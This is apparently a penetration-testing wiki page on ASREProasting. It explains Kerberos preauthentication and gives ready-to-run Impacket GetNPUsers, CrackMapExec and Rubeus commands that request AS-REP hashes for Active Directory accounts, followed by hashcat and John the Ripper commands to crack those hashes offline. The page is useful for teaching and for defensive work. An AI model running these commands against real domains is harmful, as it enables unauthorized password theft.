# ASREProast

## Theory

When asking the KDC \(Key Distribution Center\) for a TGT \(Ticket Granting Ticket\), the requesting user needs to send a piece of information \(a timestamp\) encrypted with it's own credentials. It ensures the user is requesting a TGT for himself. This is called Kerberos preauthentication.

The TGT is then sent to the user in the `KRB_AS_REP` message, but that message also contains a session key. That session key is encrypted with the requested user's NT hash.

Kerberos preauthentication prevents attackers from requesting a TGT for any user, receive the `KRB_AS_REP` message, extract the session key and crack it offline in an attempt to retrieve that user's password.

Because some applications don't support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline. This is ASREProasting.

## Practice

{% hint style="info" %}
While this attack can be carried out without any prior foothold \(domain user credentials\), there is no way of finding out users with `Do not require Kerberos preauthentication` set without that prior foothold.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) \(Python\) can get TGTs for the users that have the property `Do not require Kerberos preauthentication` set.

```bash
# with a users file
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/'

# with a password
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/USER:Password'

# with an NT hash
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' 'DOMAIN/USER'
```

This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\).

```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt
```
{% endtab %}

{% tab title="Windows" %}
The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.

```bash
Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
```
{% endtab %}
{% endtabs %}

Depending on the output format used \(`hashcat` or `john`\), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try cracking the hashes.

```bash
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
```

```bash
john --wordlist=$wordlist ASREProastables.txt
```

## Resources

{% embed url="https://blog.xpnsec.com/kerberos-attacks-part-2/" caption="" %}

{% embed url="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" caption="" %}

{% embed url="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx" caption="" %}

{% embed url="https://en.hackndo.com/kerberos" caption="" %}

